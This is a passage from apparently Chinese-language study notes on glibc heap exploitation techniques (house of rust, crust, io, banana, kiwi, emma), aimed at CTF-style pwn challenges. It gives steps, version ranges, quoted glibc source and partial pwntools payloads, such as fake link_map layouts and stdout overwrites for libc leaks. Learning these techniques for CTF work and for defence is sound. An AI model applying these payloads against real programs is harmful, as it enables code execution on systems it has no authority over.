chunk</code>）</li><li>释放前7个chunk进入tcache，之后释放chunkB进入unsortedbin，然后释放chunkA与chunkB合并</li><li>之后从tcache中分配一个chunk</li><li>然后再次释放chunkB，使得chunkB进入tcache，此时chunkB就既位于unsortedbin也位于tcache中</li><li>之后再次申请一个chunk，就得到了chunkB，但是此时的chunkB还位于unsortedbin</li></ul><h3 id="相关技巧-12"><a href="#相关技巧-12" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul><li>在高版本需要绕过指针保护的检查</li></ul><h3 id="利用效果-12"><a href="#利用效果-12" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>构造出<strong>堆重叠</strong>，为后续利用做准备</li></ul><h2 id="house-of-rust"><a href="#house-of-rust" class="headerlink" title="house of rust"></a>house of rust</h2><h3 id="漏洞成因-13"><a href="#漏洞成因-13" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出</p><h3 id="适用范围-13"><a href="#适用范围-13" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.26</code>——至今</li><li>可以进行<code>tcache stash unlinking</code>攻击</li><li>可以进行<code>largebin attack</code></li><li>不需要泄露地址</li></ul><h3 id="利用原理-13"><a href="#利用原理-13" class="headerlink" title="利用原理"></a>利用原理</h3><p><strong>前置知识</strong></p><p>首先需要知道<code>tcachebin stash unlinking</code>，下面称之为<code>TSU</code>技巧：</p><ul><li><code>tcachebin[A]</code>为空</li><li><code>smallbin[A]</code>有<code>8</code>个</li><li>修改第<code>8</code>个<code>smallbin chunk</code>的<code>bk</code>为<code>addr</code></li><li>分配<code>malloc(A)</code>的时候，<code>addr+0x10</code>会被写一个<code>libc</code>地址</li></ul><p>还要知道<code>tcachebin stash unlinking+</code>，下面称之为<code>TSU+</code>技巧：</p><ul><li><code>tcachebin[A]</code>为空</li><li><code>smallbin[A]</code>有<code>8</code>个</li><li>修改第<code>7</code>个<code>smallbin chunk</code>的<code>bk</code>为<code>addr</code>，还要保证<code>*(addr+0x18)</code>是一个合法可写的地址</li><li>分配<code>malloc(A)</code>的时候，<code>addr</code>会被链入到<code>tcachebin</code>，也就是可以分配到<code>addr</code>处</li></ul><p><strong>第一阶段：堆风水布局（Heap Feng Shui）</strong></p><ul><li>首先先分配14个0x90的chunk(编号1-14)，然后再接替释放到tcache和smallbin中（1\3\5\7\9\11\13释放到tcahce….）</li><li>之后通过分配大chunk将unsortedbin中的都放入smallbin</li></ul><p><strong>第二阶段：Tcache Stashing Unlink+ 结合 Largebin 攻击</strong></p><ul><li>然后通过WAF修改chunk14的size片段为0xB0，之后再次释放chunk14到tcahce[0xB0]中，此时他的bk就是tcahce_key，也就是<code>&amp;tcahce_perthread_struct+0x10</code>，但是同时也造成了smallbin链的破坏</li><li>再次修改chunk14的bk的最低字节为0x80，指向<code>tcache_perthread_struct + 0x80 - 0x18</code>（0x30 tcache头部附近）</li><li>之后通过largebin attack修改chunk14的fd以修复smallbin链</li><li>清空tcahe然后再次分配0x90块，触发Tcache Stashing Unlink+机制，使得0x90 tcache头部指向<code>tcache_perthread_struct + 0x80</code></li></ul><p><strong>第三阶段：Tcache Stashing Unlink 结合二次Largebin攻击</strong></p><ul><li>分配15个0xa0的块</li><li>通过将<code>Tcache Stashing Unlink</code>将libc地址写入<code>tcache_perthread_struct</code></li></ul><p><strong>第四阶段：stdout FSOP泄露libc</strong></p><ul><li>利用第三阶段写入的libc地址，部分写，多次爆破，即可将chunk分配到<code>_IO_2_1_stdout_</code>结构</li><li>之后通过结构体复写即可触发libc泄露，泄露完就简单多了</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_flags = <span class="number">0xfbad1800</span></span><br><span class="line">payload=p64(_flags)+p64(<span class="number">0</span>)*<span class="number">3</span></span><br></pre></td></tr></table></figure><p><strong>第五阶段：最终Shell获取</strong></p><ul><li><code>__free_hook</code>写system或者onegadget都是可以的</li></ul><p>上面的过程最好的情况下需要爆破<code>1/16</code>，最差<code>1/256</code>。</p><p><strong>但是</strong>，<code>2.34</code>之后，<code>tcache_key</code>是一个随机数，不是<code>tcache_perthread_struct + 0x10</code>了。</p><p>所以，此时可以加上<code>largebin attack</code>，把以上的第二步变为：继续用<code>largebin attack</code>向其<code>bk</code>写一个堆地址，然后还要部分写<code>bk</code>使其落在<code>tcache_perthread_struct</code>区域。其他步骤一样。</p><p>或者，在<code>smallbin</code>里面放<code>9</code>个，这样第<code>8</code>个的<code>bk</code>肯定就是一个堆地址。此时就需要爆破<code>1/16</code>的堆，<code>1/16</code>的<code>glibc</code>地址，成功的概率是<code>1/256</code>。</p><h3 id="相关技巧-13"><a href="#相关技巧-13" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul><li>总的来说，就是利用<code>tcachebin stash unlinking</code>打<code>tcache_perthread_struct</code></li><li>利用<code>largebin attack</code>构造合法地址</li></ul><h3 id="利用效果-13"><a href="#利用效果-13" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>任意地址分配</li><li>任意函数执行</li></ul><h2 id="house-of-crust"><a href="#house-of-crust" class="headerlink" title="house of crust"></a>house of crust</h2><h3 id="漏洞成因-14"><a href="#漏洞成因-14" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出</p><h3 id="适用范围-14"><a href="#适用范围-14" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.26</code>——<code>2.37</code></li><li>可以进行<code>tcache stash unlinking</code>攻击</li><li>可以进行<code>largebin attack</code></li><li>不需要泄露地址</li></ul><h3 id="利用原理-14"><a href="#利用原理-14" class="headerlink" title="利用原理"></a>利用原理</h3><p>其他步骤和上面的<code>house of rust</code>一样，但是到第五步的时候，去修改<code>global_max_fast</code></p><p>后面的步骤和<code>house of corrosion</code>是一样的，通过写原语打<code>stderr</code>修改<code>one_gadget</code>拿到<code>shell</code>。</p><h3 id="相关技巧-14"><a href="#相关技巧-14" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul><li><code>house of crust = house of corrosion + house of rust</code></li><li><code>2.37</code>之后，<code>house of corrosion</code>使用受限</li></ul><h2 id="house-of-io"><a href="#house-of-io" class="headerlink" title="house of io"></a>house of io</h2><h3 id="漏洞成因-15"><a href="#漏洞成因-15" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出</p><h3 id="适用范围-15"><a href="#适用范围-15" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.26</code>—— 至今</li></ul><h3 id="利用原理-15"><a href="#利用原理-15" class="headerlink" title="利用原理"></a>利用原理</h3><p>其他博客上对该方法的介绍如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The tcache_perthread_object is allocated when the heap is created. Furthermore, it is stored right at the heap&#x27;s beginning (at a relatively low memory address). The safe-linking mitigation aims to protect the fd/next pointer within the free lists. However, the head of each free-list is not protected. Additionally, freeing a chunk and placing it into the tcachebin also places a non-protected pointer to the appropriate tcache entry in the 2nd qword of a chunks&#x27; user data. The House of IO assumes one of three scenarios for the bypass to work. First, any attacker with a controlled linear buffer underflow over a heap buffer, or a relative arbitrary write will be able to corrupt the tcache. Secondly, a UAF bug allowing to read from a freed tcache eligible chunk leaks the tcache and with that, the heap base. Thirdly, a badly ordered set of calls to free(), ultimately passing the address of the tcache itself to free, would link the tcache into the 0x290 sized tcachebin. Allocating it as a new chunk would mean complete control over the tcache&#x27;s values.</span><br></pre></td></tr></table></figure><p>可以看出来，其实就是对 <code>tcache_perthread_struct</code> 结构体的攻击，想办法将其释放掉，然后再申请回来，申请回来的时候就能控制整个 <code>tcache</code> 的分配。</p><h3 id="相关技巧-15"><a href="#相关技巧-15" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul><li>围绕 <code>tcache_perthread_struct</code> 进行攻击</li></ul><h3 id="利用效果-14"><a href="#利用效果-14" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>任意地址分配</li></ul><h2 id="house-of-banana"><a href="#house-of-banana" class="headerlink" title="house of banana"></a>house of banana</h2><h3 id="漏洞成因-16"><a href="#漏洞成因-16" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出</p><h3 id="适用范围-16"><a href="#适用范围-16" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>—— 至今</li><li>可以进行 <code>largebin attack</code></li><li>能执行 <code>exit</code> 函数</li></ul><h3 id="利用原理-16"><a href="#利用原理-16" class="headerlink" title="利用原理"></a>利用原理</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nmaps; ++i)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">link_map</span> *l = maps[i];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (l-&gt;l_init_called)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Make sure nothing happens if we are called twice.  */</span></span><br><span class="line">        l-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Is there a destructor function?  */</span></span><br><span class="line">        <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span></span><br><span class="line">            || (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* When debugging print a message first.  */</span></span><br><span class="line">            <span class="keyword">if</span> (__builtin_expect (<span class="built_in">GLRO</span>(dl_debug_mask)</span><br><span class="line">                                  &amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">                _dl_debug_printf (<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,</span><br><span class="line">                                  <span class="built_in">DSO_FILENAME</span> (l-&gt;l_name),</span><br><span class="line">                                  ns);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* First see whether an array is given.  */</span></span><br><span class="line">            <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">ElfW</span>(Addr) *array =</span><br><span class="line">                    (<span class="built_in">ElfW</span>(Addr) *) (l-&gt;l_addr</span><br><span class="line">                                    + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">                <span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">                                  / <span class="built_in">sizeof</span> (<span class="built_in">ElfW</span>(Addr)));</span><br><span class="line">                <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">                    ((<span class="type">fini_t</span>) array[i]) ();  <span class="comment">//调用函数</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* Next try the old-style destructor.  */</span></span><br><span class="line">            <span class="keyword">if</span> (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">                <span class="built_in">DL_CALL_DT_FINI</span></span><br><span class="line">                (l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">        <span class="comment">/* Auditing checkpoint: another object closed.  */</span></span><br><span class="line">        _dl_audit_objclose (l);</span><br><span class="line">        <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Correct the previous increment.  */</span></span><br><span class="line">    --l-&gt;l_direct_opencount;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ElfW</span>(Addr) *array =</span><br><span class="line">    (<span class="built_in">ElfW</span>(Addr) *) (l-&gt;l_addr</span><br><span class="line">                    + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);<span class="comment">//DT_FINI_ARRAY=26 d_un.d_ptr偏移为8</span></span><br></pre></td></tr></table></figure><p>也就是我们将<code>l-&gt;l_info[26]</code>写入<code>l_info[26]</code>的地址，<code>array</code>的值就是<code>l_info[27]</code>中存放的值</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">                  / <span class="built_in">sizeof</span> (<span class="built_in">ElfW</span>(Addr))); <span class="comment">//DT_FINI_ARRAYSZ=28，还是偏移8</span></span><br></pre></td></tr></table></figure><p>也就是说我们在<code>l_info[28]</code>写入<code>l_info[28]</code>的地址，<code>i</code>的值就是<code>l_info[29]中存放的值/8</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">    ((<span class="type">fini_t</span>) array[i]) ();  <span class="comment">//调用函数</span></span><br></pre></td></tr></table></figure><p>最后会执行<code>array[i]-&gt;array[0]</code>，从i到0调用</p><p><strong>2.31打orw：</strong></p><ul><li><p>通过largebin attack伪造<code>_rtld_global</code>的<code>link_map</code>地址</p></li><li><p>然后布局link_map打orw</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">link_map=p64(<span class="number">0</span>)</span><br><span class="line">link_map+=p64(libc_base+<span class="number">0x223740</span>)<span class="comment">#l_next</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)</span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xb90</span>+<span class="number">0x40</span>)<span class="comment">#l_real</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)*<span class="number">28</span> </span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xc08</span>+<span class="number">0x98</span>+<span class="number">0x40</span>)<span class="comment">#l-&gt;l_info[26]</span></span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xc08</span>+<span class="number">32</span>+<span class="number">0x98</span>+<span class="number">0x40</span>)<span class="comment">#l-&gt;l_info[26]-&gt;d_un.d_ptr    </span></span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xc08</span>+<span class="number">0x10</span>+<span class="number">0x98</span>+<span class="number">0x40</span>)<span class="comment">#l-&gt;l_info[28]</span></span><br><span class="line">link_map+=p64(<span class="number">0x20</span>)<span class="comment">#//i=l-&gt;l_info[28]-&gt;d_un.d_val</span></span><br><span class="line">link_map+=<span class="string">b&quot;flag\x00\x00\x00\x00&quot;</span></span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xb90</span>+<span class="number">0x40</span>)</span><br><span class="line">link_map+=p64(setcontext)</span><br><span class="line">link_map+=p64(ret_addr)</span><br><span class="line">link_map+=p64(<span class="number">0</span>)*<span class="number">12</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)<span class="comment">#rdi</span></span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xdc8</span>)<span class="comment">#rsi</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">link_map+=p64(<span class="number">0x100</span>)<span class="comment">#rdx</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br></pre></td></tr></table></figure></li></ul><p><strong>2.27打onegadget：</strong></p><ul><li><p>link_map：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">link_map=<span class="built_in">p64</span>(<span class="number">0</span>)*<span class="number">1</span></span><br><span class="line">link_map+=<span class="built_in">p64</span>(libc_base+<span class="number">0x61c710</span>)#l_next</span><br><span class="line">link_map+=<span class="built_in">p64</span>(<span class="number">0</span>)</span><br><span class="line">link_map+=<span class="built_in">p64</span>(heap_base+<span class="number">0xb90</span>)#l_real</span><br><span class="line">link_map+=<span class="built_in">p64</span>(<span class="number">0</span>)*<span class="number">28</span> </span><br><span class="line">link_map+=<span class="built_in">p64</span>(heap_base+<span class="number">0xc08</span>+<span class="number">0x98</span>)<span class="meta">#l-&gt;l_info[26]</span></span><br><span class="line">link_map+=<span class="built_in">p64</span>(heap_base+<span class="number">0xc08</span>+<span class="number">32</span>+<span class="number">0x98</span>)<span class="meta">#l-&gt;l_info[26]-&gt;d_un.d_ptr    </span></span><br><span class="line">link_map+=<span class="built_in">p64</span>(heap_base+<span class="number">0xc08</span>+<span class="number">0x10</span>+<span class="number">0x98</span>)<span class="meta">#l-&gt;l_info[28]</span></span><br><span class="line">link_map+=<span class="built_in">p64</span>(<span class="number">8</span>)#<span class="comment">//i=l-&gt;l_info[28]-&gt;d_un.d_val</span></span><br><span class="line">link_map+=<span class="built_in">p64</span>(one_gadget)</span><br><span class="line">link_map+=<span class="built_in">p64</span>(heap_base+<span class="number">0xb90</span>)</span><br><span class="line">link_map+=<span class="built_in">p64</span>(<span class="number">0</span>)*<span class="number">58</span></span><br><span class="line">link_map+=<span class="built_in">p64</span>(<span class="number">0x800000000</span>)</span><br></pre></td></tr></table></figure></li></ul><h3 id="相关技巧-16"><a href="#相关技巧-16" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul><li>伪造 <code>fini_array</code> 数组的时候，是从后往前遍历的</li><li>有时候远程的 <code>rtld_global</code> 的偏移与本地不一样，需要爆破</li><li>如果不想逐个伪造，可以直接用 <code>gdb</code> 从内存里面 <code>dump</code> 出来，然后基于偏移修改内存即可</li></ul><h3 id="利用效果-15"><a href="#利用效果-15" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>任意代码执行</li></ul><h2 id="house-of-kiwi"><a href="#house-of-kiwi" class="headerlink" title="house of kiwi"></a>house of kiwi</h2><h3 id="漏洞成因-17"><a href="#漏洞成因-17" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出</p><h3 id="适用范围-17"><a href="#适用范围-17" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>——<code>2.36</code></li><li>在 <code>malloc</code> 流程中触发 <code>assert</code></li></ul><h3 id="利用原理-17"><a href="#利用原理-17" class="headerlink" title="利用原理"></a>利用原理</h3><p>主要是提供了一种在程序中调用 <code>IO</code> 流函数的思路：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> IS_IN (libc)</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> NDEBUG</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> __assert_fail(assertion, file, <span class="keyword">line</span>, function)\</span></span><br><span class="line"><span class="meta"> __malloc_assert(assertion, file, <span class="keyword">line</span>, function)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">const</span> <span class="type">char</span> *__progname;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line"> <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">     __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">     file, line,</span><br><span class="line">     function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">     assertion);</span><br><span class="line">  <span class="built_in">fflush</span> (stderr);</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>可以看到，调用到了 <code>fxprintf</code> 和 <code>fflush(stderr)</code>。对stderr进行劫持</p><p>在<code>_int_malloc</code>中</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">assert</span> ((old_top == <span class="built_in">initial_top</span> (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">        ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         <span class="built_in">prev_inuse</span> (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="type">unsigned</span> <span class="type">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br></pre></td></tr></table></figure><p>这个对top进行了assert判断</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">old_size &gt;= <span class="number">0x20</span>;</span><br><span class="line">old_top.prev_inuse = <span class="number">0</span>;</span><br><span class="line">old_top页对齐</span><br></pre></td></tr></table></figure><p>因此只要堆溢出改个size就可以触发assert了</p><p>在<code>__fxprintf</code>函数中调用的是偏移0x38的指针</p><p>在<code>fflush</code>函数中调用到了一个指针:位于<code>_IO_file_jumps</code>中的<code>_IO_file_sync</code>指针,且观察发现RDX寄存器的值为<code>IO_helper_jumps</code>指针</p><p>因此有以下的利用：</p><ul><li>通过largebin attack劫持stderr指针</li><li>通过堆溢出或其他手法触发assert</li><li>修改 <code>_IO_file_jumps + 0x60</code>的<code>_IO_file_sync</code>指针为<code>setcontext+61</code></li><li>修改<code>IO_helper_jumps + 0xA0 and 0xA8</code>分别为可迁移的存放有ROP的位置和ret指令的gadget位置,则可以进行栈迁移(感觉条件要求好多，但是对于assert触发的IO可以利用)</li></ul><h3 id="利用效果-16"><a href="#利用效果-16" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>触发 <code>IO</code> 处理流程，为后续利用做准备</li></ul><h2 id="house-of-emma"><a href="#house-of-emma" class="headerlink" title="house of emma"></a>house of emma</h2><h3 id="漏洞成因-18"><a href="#漏洞成因-18" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出</p><h3 id="适用范围-18"><a href="#适用范围-18" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>—— 至今</li><li>可以进行两次 <code>largebin attack</code></li><li>或者可以进行两次任意地址写堆地址</li><li>可以触发 <code>IO</code> 流操作</li></ul><h3 id="利用原理-18"><a href="#利用原理-18" class="headerlink" title="利用原理"></a>利用原理</h3><p>在vtable的合法范围之内，存在<code>_IO_cookie_jumps</code>，可以通过偏移来调用vtable表里的所有函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> _IO_cookie_jumps libio_vtable = &#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(finish, _IO_file_finish),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(overflow, _IO_file_overflow),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(underflow, _IO_file_underflow),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(uflow, _IO_default_uflow),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(pbackfail, _IO_default_pbackfail),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(xsputn, _IO_file_xsputn),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(seekoff, _IO_cookie_seekoff),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(seekpos, _IO_default_seekpos),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(setbuf, _IO_file_setbuf),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(sync, _IO_file_sync),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(doallocate, _IO_file_doallocate),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(read, _IO_cookie_read),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(write, _IO_cookie_write),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(seek, _IO_cookie_seek),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(close, _IO_cookie_close),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(stat, _IO_default_stat),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(imbue, _IO_default_imbue),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_read (FILE *fp, <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span 